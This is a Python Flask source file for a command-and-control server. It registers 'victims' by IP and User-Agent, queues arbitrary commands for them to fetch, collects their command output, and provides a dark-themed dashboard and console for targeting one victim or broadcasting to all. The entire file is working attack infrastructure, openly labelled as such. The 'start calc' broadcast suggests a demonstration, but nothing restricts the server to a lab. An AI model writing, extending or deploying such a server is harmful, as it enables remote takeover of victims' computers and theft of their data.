from flask import Flask, request, render_template_string, redirect, url_for
from flask_cors import CORS
from threading import Thread, Lock
from collections import defaultdict
import time
import signal
import sys

app = Flask(__name__)
CORS(app)

# Command queue: identity -> list of commands
command_queue = defaultdict(list)
queue_lock = Lock()

# Victim identity -> {'last_seen': timestamp, 'id': short_id}
victims_last_seen = defaultdict(lambda: {'last_seen': 0.0, 'id': None})
id_to_identity = {}  # short_id -> identity
next_victim_id = 1  # For generating short IDs
output_log = []  # Store recent outputs

running = True
log_file = open("c2_log.txt", "a")

def get_identity():
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'unknown')
    return f"{ip} | {user_agent}"

@app.route('/commands', methods=['GET'])
def get_command():
    global next_victim_id
    identity = get_identity()
    if victims_last_seen[identity]['id'] is None:
        short_id = f"victim{next_victim_id}"
        victims_last_seen[identity] = {'last_seen': time.time(), 'id': short_id}
        id_to_identity[short_id] = identity
        next_victim_id += 1
        log(f"[New Victim] {short_id}: {identity}")
    else:
        victims_last_seen[identity]['last_seen'] = time.time()

    with queue_lock:
        if command_queue[identity]:
            cmd = command_queue[identity].pop(0)
            log(f"[Sent to {victims_last_seen[identity]['id']}] {cmd}")
            return cmd
        return "noop"

@app.route('/output', methods=['POST'])
def receive_output():
    global next_victim_id
    identity = get_identity()
    if victims_last_seen[identity]['id'] is None:
        short_id = f"victim{next_victim_id}"
        victims_last_seen[identity] = {'last_seen': time.time(), 'id': short_id}
        id_to_identity[short_id] = identity
        next_victim_id += 1
        log(f"[New Victim] {short_id}: {identity}")
    else:
        victims_last_seen[identity]['last_seen'] = time.time()

    output = request.form.get('output')
    ack = request.form.get('ack')
    if output:
        short_id = victims_last_seen[identity]['id']
        log(f"[{short_id} Output]\n{output}")
        output_log.append({
            'victim_id': short_id,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'output': output
        })
        if len(output_log) > 10:
            output_log.pop(0)  # Keep only the last 10 outputs
    if ack:
        log(f"[{short_id} ACK]: {ack}")
    return "OK"

@app.route('/send-calc', methods=['POST'])
def send_calc():
    command = "start calc"
    with queue_lock:
        for identity in victims_last_seen.keys():
            command_queue[identity].append(command)
    log("[Dashboard] Broadcasted 'start calc' to all victims")
    return redirect(url_for('dashboard'))

@app.route('/send_command', methods=['POST'])
def send_command():
    victim_id = request.form['victim_id']
    command = request.form['command']
    if victim_id in id_to_identity:
        identity = id_to_identity[victim_id]
        with queue_lock:
            command_queue[identity].append(command)
        log(f"[Dashboard] Sent command '{command}' to {victim_id}")
        return redirect(url_for('dashboard'))
    else:
        return "Invalid victim ID", 400

@app.route('/dashboard')
def dashboard():
    now = time.time()
    html = """
    <html>
    <head>
        <title>C2 Victim Dashboard</title>
        <meta http-equiv="refresh" content="5">
        <style>
            body {
                background-color: #121212;
                color: #eee;
                font-family: Arial, sans-serif;
                padding: 20px;
            }
            table {
                width: 100%;
                border-collapse: collapse;
                margin-bottom: 20px;
            }
            th, td {
                padding: 10px;
                border: 1px solid #444;
                text-align: left;
            }
            th {
                background-color: #222;
            }
            .online {
                color: lime;
            }
            .offline {
                color: red;
            }
            td.identity {
                max-width: 300px;
                word-wrap: break-word;
            }
            form {
                margin-bottom: 20px;
            }
            label {
                margin-right: 10px;
            }
            input[type="text"] {
                width: 300px;
                padding: 5px;
            }
            select {
                padding: 5px;
            }
            button {
                padding: 5px 10px;
                cursor: pointer;
            }
            pre {
                background-color: #222;
                padding: 10px;
                border: 1px solid #444;
                white-space: pre-wrap;
                color: #eee;
            }
            ul {
                list-style-type: none;
                padding: 0;
            }
            li {
                margin-bottom: 10px;
            }
        </style>
    </head>
    <body>
        <h2>🧠 Victim Status Dashboard</h2>

        {% if victims %}
        <form method="post" action="/send_command">
            <label for="victim_id">Select Victim:</label>
            <select name="victim_id" id="victim_id">
                {% for identity, data in victims.items() %}
                <option value="{{ data['id'] }}">{{ data['id'] }} - {{ identity }}</option>
                {% endfor %}
            </select>
            <label for="command">Command:</label>
            <input type="text" name="command" id="command" required>
            <button type="submit">Send Command</button>
        </form>
        {% else %}
        <p>No victims connected yet.</p>
        {% endif %}

        <form method="post" action="/send-calc">
            <button type="submit">Start Calc (All Victims)</button>
        </form>

        <table>
            <tr><th>ID</th><th>Identity (IP + User-Agent)</th><th>Last Seen</th><th>Status</th></tr>
            {% for identity, data in victims.items() %}
                <tr>
                    <td>{{ data['id'] }}</td>
                    <td class="identity">{{ identity }}</td>
                    <td>{{ "%.2f"|format(now - data['last_seen']) }}s ago</td>
                    <td class="{{ 'online' if now - data['last_seen'] < 15 else 'offline' }}">
                        {{ 'Online' if now - data['last_seen'] < 15 else 'Offline' }}
                    </td>
                </tr>
            {% endfor %}
        </table>

        <h3>Recent Outputs</h3>
        {% if output_log %}
        <ul>
            {% for log in output_log %}
            <li>{{ log['victim_id'] }} - {{ log['timestamp'] }}: <pre>{{ log['output']|e }}</pre></li>
            {% endfor %}
        </ul>
        {% else %}
        <p>No recent outputs.</p>
        {% endif %}
    </body>
    </html>
    """
    return render_template_string(html, victims=victims_last_seen, now=now, output_log=output_log)

def log(msg):
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    print(f"[{timestamp}] {msg}")
    log_file.write(f"[{timestamp}] {msg}\n")
    log_file.flush()

def command_input_loop():
    global running
    while running:
        try:
            cmd_input = input(">>> ").strip()
            if cmd_input:
                if cmd_input == "list":
                    now = time.time()
                    log("Known victims:")
                    for identity, data in victims_last_seen.items():
                        status = "Online" if now - data['last_seen'] < 15 else "Offline"
                        log(f"{data['id']}: {identity} - Last seen {now - data['last_seen']:.2f}s ago - {status}")
                elif cmd_input.startswith("broadcast:"):
                    command = cmd_input[len("broadcast:"):].strip()
                    with queue_lock:
                        for identity in victims_last_seen.keys():
                            command_queue[identity].append(command)
                    log(f"[Broadcast] Added '{command}' to all known victims")
                elif ":" in cmd_input:
                    target, command = cmd_input.split(":", 1)
                    target = target.strip()
                    command = command.strip()
                    if target in id_to_identity:
                        identity = id_to_identity[target]
                        with queue_lock:
                            command_queue[identity].append(command)
                        log(f"[Targeted] Added '{command}' to {target} ({identity})")
                    else:
                        log(f"Unknown victim ID: {target}")
                else:
                    log("Invalid format. Use 'list', 'broadcast: <cmd>', or 'victimX: <cmd>'")
        except EOFError:
            break

def handle_shutdown(sig, frame):
    global running
    print("\n[!] Shutting down C2 server...")
    log_file.close()
    running = False
    sys.exit(0)

def main():
    signal.signal(signal.SIGINT, handle_shutdown)
    signal.signal(signal.SIGTERM, handle_shutdown)
    log("C2 Server starting on port 8000...")
    Thread(target=command_input_loop, daemon=True).start()
    app.run(host='0.0.0.0', port=8000, threaded=True)

if __name__ == '__main__':
    main()
